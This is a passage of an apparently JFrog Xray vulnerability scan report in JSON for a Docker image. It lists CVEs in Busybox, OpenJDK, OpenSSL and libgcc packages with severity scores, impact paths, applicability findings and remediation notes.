                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2021-35556",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-190226",
                    "summary": "A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the handle_special function",
                    "description": "A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the handle_special function",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2021-42384",
                            "cwe": [
                                "CWE-416"
                            ],
                            "cvss_v2": "6.5/CVSS:2.0/AV:N/AC:L/Au:S/C:P/I:P/A:P",
                            "cvss_v3": "7.2/CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"
                        }
                    ],
                    "created": "2021-11-18T00:00:00.033Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:busybox:1.30.1-r5",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:ssl_client:1.30.1-r5"
                    ],
                    "extended_information": {
                        "short_description": "A use-after-free in Busybox awk leads to remote code execution when processing malformed command line arguments.",
                        "full_description": "The [BusyBox](https://busybox.net/) toolkit implements a large number of Linux tools in a single executable and can even replace the Linux init system. Its small size and flexibility make it popular in embedded devices.\n\nA use-after-free in awk leads to denial of service and possibly code execution when processing a crafted awk pattern in the `handle_special` function.\nAn attacker that controls the `awk` pattern (through the command line argument) can trigger this issue.",
                        "jfrog_research_severity": "Medium",
                        "jfrog_research_severity_reasons": [
                            {
                                "name": "The prerequisites for exploiting the issue are extremely unlikely",
                                "description": "The applet must accept arbitrary command line arguments from an external source",
                                "is_positive": true
                            },
                            {
                                "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                                "description": "The attacker would need to determine which external input propagates into the applet's command line arguments",
                                "is_positive": true
                            },
                            {
                                "name": "The issue cannot result in a severe impact (such as remote code execution)",
                                "description": "Full control of the `awk` pattern usually leads to RCE, without needing to exploit this UAF. The issue is mostly relevant if the attacker can control the pattern, but it is filtered before being passed to `awk`.",
                                "is_positive": true
                            }
                        ],
                        "remediation": "##### Development mitigations\n\nComment out `CONFIG_AWK=y` in Busybox's `.config` file and recompile"
                    },
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:busybox:1.30.1-r5",
                            "cve_id": "CVE-2021-42384",
                            "scan_status": 1,
                            "applicability": false,
                            "evidence": [
                                {
                                    "column_names": [
                                        "Path",
                                        "Evidence",
                                        "Line Number",
                                        "Issue Found"
                                    ],
                                    "rows": [
                                        [
                                            "/bin/busybox",
                                            "awk",
                                            "2988",
                                            "Busybox executable with awk applet was found"
                                        ],
                                        [
                                            "/bin/busybox",
                                            "awk",
                                            "4192",
                                            "Busybox executable with awk applet was found"
                                        ]
                                    ]
                                }
                            ],
                            "info": "Vulnerable usage of awk was {not }found",
                            "details": [
                                {
                                    "file_path": "/bin/busybox",
                                    "details": "Evidence: awk, Line Number: 2988, Issue Found: Busybox executable with awk applet was found"
                                },
                                {
                                    "file_path": "/bin/busybox",
                                    "details": "Evidence: awk, Line Number: 4192, Issue Found: Busybox executable with awk applet was found"
                                }
                            ]
                        },
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:ssl_client:1.30.1-r5",
                            "cve_id": "CVE-2021-42384",
                            "scan_status": 1,
                            "applicability": false,
                            "evidence": [
                                {
                                    "column_names": [
                                        "Path",
                                        "Evidence",
                                        "Line Number",
                                        "Issue Found"
                                    ],
                                    "rows": [
                                        [
                                            "/bin/busybox",
                                            "awk",
                                            "2988",
                                            "Busybox executable with awk applet was found"
                                        ],
                                        [
                                            "/bin/busybox",
                                            "awk",
                                            "4192",
                                            "Busybox executable with awk applet was found"
                                        ]
                                    ]
                                }
                            ],
                            "info": "Vulnerable usage of awk was {not }found",
                            "details": [
                                {
                                    "file_path": "/bin/busybox",
                                    "details": "Evidence: awk, Line Number: 2988, Issue Found: Busybox executable with awk applet was found"
                                },
                                {
                                    "file_path": "/bin/busybox",
                                    "details": "Evidence: awk, Line Number: 4192, Issue Found: Busybox executable with awk applet was found"
                                }
                            ]
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:busybox:1.30.1-r5",
                            "vulnerability_id": "CVE-2021-42384",
                            "result": "not_applicable"
                        },
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:ssl_client:1.30.1-r5",
                            "vulnerability_id": "CVE-2021-42384",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-187939",
                    "summary": "Vulnerability in the Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Hotspot). Supported versions that are affected are Java SE: 7u311, 8u301; Oracle GraalVM Enterprise Edition: 20.3.3 and 21.2.0. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Oracle GraalVM Enterprise Edition. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 3.1 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:N/A:L).",
                    "description": "Vulnerability in the Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Hotspot). Supported versions that are affected are Java SE: 7u311, 8u301; Oracle GraalVM Enterprise Edition: 20.3.3 and 21.2.0. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Oracle GraalVM Enterprise Edition. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 3.1 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:N/A:L).",
                    "issue_type": "security",
                    "severity": "Low",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2021-35588",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v2": "2.6/CVSS:2.0/AV:N/AC:H/Au:N/C:N/I:N/A:P",
                            "cvss_v3": "3.1/CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:N/A:L"
                        }
                    ],
                    "created": "2021-10-21T00:00:00.205Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2021-35588",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-539878",
                    "summary": "The openssl (aka node-openssl) NPM package through 2.0.0 was characterized as \"a nonsense wrapper with no real purpose\" by its author, and accepts an opts argument that contains a verb field (used for command execution). NOTE: This vulnerability only affects products that are no longer supported by the maintainer.",
                    "description": "The openssl (aka node-openssl) NPM package through 2.0.0 was characterized as \"a nonsense wrapper with no real purpose\" by its author, and accepts an opts argument that contains a verb field (used for command execution). NOTE: This vulnerability only affects products that are no longer supported by the maintainer.",
                    "issue_type": "security",
                    "severity": "Critical",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2023-49210",
                            "cwe": [
                                "CWE-77"
                            ],
                            "cvss_v3": "9.8/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
                        }
                    ],
                    "created": "2023-11-28T00:00:00.452Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libcrypto1.1:1.1.1k-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libssl1.1:1.1.1k-r0"
                    ],
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libcrypto1.1:1.1.1k-r0",
                            "cve_id": "CVE-2023-49210",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether the vulnerable <code>openssl</code> function is used with external input.</p>",
                            "evidence": null,
                            "info": "The vulnerable function openssl is never called with external input",
                            "details": null
                        },
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libssl1.1:1.1.1k-r0",
                            "cve_id": "CVE-2023-49210",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether the vulnerable <code>openssl</code> function is used with external input.</p>",
                            "evidence": null,
                            "info": "The vulnerable function openssl is never called with external input",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libcrypto1.1:1.1.1k-r0",
                            "vulnerability_id": "CVE-2023-49210",
                            "result": "not_applicable"
                        },
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libssl1.1:1.1.1k-r0",
                            "vulnerability_id": "CVE-2023-49210",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-590725",
                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Hotspot).  Supported versions that are affected are Oracle Java SE: 8u391, 8u391-perf, 11.0.21, 17.0.9, 21.0.1; Oracle GraalVM for JDK: 17.0.9, 21.0.1; Oracle GraalVM Enterprise Edition: 20.3.12, 21.3.8 and  22.3.4. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in  unauthorized creation, deletion or modification access to critical data or all Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability can only be exploited by supplying data to APIs in the specified Component without using Untrusted Java Web Start applications or Untrusted Java applets, such as through a web service. CVSS 3.1 Base Score 5.9 (Integrity impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N).",
                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Hotspot).  Supported versions that are affected are Oracle Java SE: 8u391, 8u391-perf, 11.0.21, 17.0.9, 21.0.1; Oracle GraalVM for JDK: 17.0.9, 21.0.1; Oracle GraalVM Enterprise Edition: 20.3.12, 21.3.8 and  22.3.4. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in  unauthorized creation, deletion or modification access to critical data or all Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability can only be exploited by supplying data to APIs in the specified Component without using Untrusted Java Web Start applications or Untrusted Java applets, such as through a web service. CVSS 3.1 Base Score 5.9 (Integrity impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N).",
                    "issue_type": "security",
                    "severity": "Unknown",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2024-20919",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ]
                        }
                    ],
                    "created": "2024-02-17T00:00:00.961Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2024-20919",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-670060",
                    "summary": "Issue summary: A timing side-channel which could potentially allow recovering\nthe private key exists in the ECDSA signature computation.\n\nImpact summary: A timing side-channel in ECDSA signature computations\ncould allow recovering the private key by an attacker. However, measuring\nthe timing would require either local access to the signing application or\na very fast network connection with low latency.\n\nThere is a timing signal of around 300 nanoseconds when the top word of\nthe inverted ECDSA nonce value is zero. This can happen with significant\nprobability only for some of the supported elliptic curves. In particular\nthe NIST P-521 curve is affected. To be able to measure this leak, the attacker\nprocess must either be located in the same physical computer or must\nhave a very fast network connection with low latency. For that reason\nthe severity of this vulnerability is Low.\n\nThe FIPS modules in 3.4, 3.3, 3.2, 3.1 and 3.0 are affected by this issue.",
                    "description": "Issue summary: A timing side-channel which could potentially allow recovering\nthe private key exists in the ECDSA signature computation.\n\nImpact summary: A timing side-channel in ECDSA signature computations\ncould allow recovering the private key by an attacker. However, measuring\nthe timing would require either local access to the signing application or\na very fast network connection with low latency.\n\nThere is a timing signal of around 300 nanoseconds when the top word of\nthe inverted ECDSA nonce value is zero. This can happen with significant\nprobability only for some of the supported elliptic curves. In particular\nthe NIST P-521 curve is affected. To be able to measure this leak, the attacker\nprocess must either be located in the same physical computer or must\nhave a very fast network connection with low latency. For that reason\nthe severity of this vulnerability is Low.\n\nThe FIPS modules in 3.4, 3.3, 3.2, 3.1 and 3.0 are affected by this issue.",
                    "issue_type": "security",
                    "severity": "Unknown",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2024-13176"
                        }
                    ],
                    "created": "2025-02-07T00:00:00.485Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libssl1.1:1.1.1k-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libcrypto1.1:1.1.1k-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2024-13176",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-190233",
                    "summary": "An incorrect handling of a special element in Busybox's ash applet leads to denial of service when processing a crafted shell command, due to the shell mistaking specific characters for reserved characters. This may be used for DoS under rare conditions of filtered command input.",
                    "description": "An incorrect handling of a special element in Busybox's ash applet leads to denial of service when processing a crafted shell command, due to the shell mistaking specific characters for reserved characters. This may be used for DoS under rare conditions of filtered command input.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2021-42375",
                            "cwe": [
                                "NVD-CWE-Other"
                            ],
                            "cvss_v2": "1.9/CVSS:2.0/AV:L/AC:M/Au:N/C:N/I:N/A:P",
                            "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2021-11-18T00:00:00.315Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:ssl_client:1.30.1-r5",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:busybox:1.30.1-r5"
                    ],
                    "extended_information": {
                        "short_description": "A incorrect handling of a special element in Busybox ash leads to denial of service when processing malformed command line arguments.",
                        "full_description": "The [BusyBox](https://busybox.net/) toolkit implements a large number of Linux tools in a single executable and can even replace the Linux init system. Its small size and flexibility make it popular in embedded devices.\n\nAn incorrect handling of a special element in `ash` leads to denial of service when processing a crafted shell command, due to the shell mistaking specific characters for reserved characters. This may be used for DoS under rare conditions of filtered command input.\nAn attacker that controls `ash` command line arguments can trigger this issue.",
                        "jfrog_research_severity": "Medium",
                        "jfrog_research_severity_reasons": [
                            {
                                "name": "The prerequisites for exploiting the issue are extremely unlikely",
                                "description": "The applet must accept arbitrary command line arguments from an external source",
                                "is_positive": true
                            },
                            {
                                "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                                "description": "The attacker would need to determine which external input propagates into the applet's command line arguments",
                                "is_positive": true
                            },
                            {
                                "name": "The issue cannot result in a severe impact (such as remote code execution)",
                                "description": "`ash` command line argument control usually leads to RCE, which is more severe than DoS. The issue is mostly relevant if the attacker can control the arguments, but they are filtered before being passed to `ash`.",
                                "is_positive": true
                            }
                        ],
                        "remediation": "##### Development mitigations\n\nComment out `CONFIG_ASH=y` in Busybox's `.config` file and recompile"
                    },
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2021-42375",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-533667",
                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: JSSE).  Supported versions that are affected are Oracle Java SE: 8u381, 8u381-perf, 11.0.20, 17.0.8, 21; Oracle GraalVM for JDK: 17.0.8, 21; Oracle GraalVM Enterprise Edition: 20.3.11, 21.3.7 and  22.3.3. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTPS to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 5.3 (Availability impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: JSSE).  Supported versions that are affected are Oracle Java SE: 8u381, 8u381-perf, 11.0.20, 17.0.8, 21; Oracle GraalVM for JDK: 17.0.8, 21; Oracle GraalVM Enterprise Edition: 20.3.11, 21.3.7 and  22.3.3. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTPS to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 5.3 (Availability impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2023-22081",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
                        }
                    ],
                    "created": "2023-10-18T00:00:00.680Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2023-22081",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-537492",
                    "summary": "GCC c++filt v2.26 was discovered to contain a use-after-free vulnerability via the component cplus-dem.c.",
                    "description": "GCC c++filt v2.26 was discovered to contain a use-after-free vulnerability via the component cplus-dem.c.",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2021-37322",
                            "cwe": [
                                "CWE-416"
                            ],
                            "cvss_v2": "6.8/CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
                            "cvss_v3": "7.8/CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
                        }
                    ],
                    "created": "2023-11-20T00:00:00.025Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:libstdc++:8.3.0-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:libgcc:8.3.0-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2021-37322",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-599301",
                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Hotspot).  Supported versions that are affected are Oracle Java SE: 8u401, 8u401-perf, 11.0.22, 17.0.10, 21.0.2, 22; Oracle GraalVM for JDK: 17.0.10, 21.0.2, 22;   Oracle GraalVM Enterprise Edition: 20.3.13 and  21.3.9. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 3.7 (Availability impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L).",
                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Hotspot).  Supported versions that are affected are Oracle Java SE: 8u401, 8u401-perf, 11.0.22, 17.0.10, 21.0.2, 22; Oracle GraalVM for JDK: 17.0.10, 21.0.2, 22;   Oracle GraalVM Enterprise Edition: 20.3.13 and  21.3.9. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 3.7 (Availability impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L).",
                    "issue_type": "security",
                    "severity": "Unknown",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2024-21011"
                        }
                    ],
                    "created": "2024-04-25T00:00:00.661Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0",
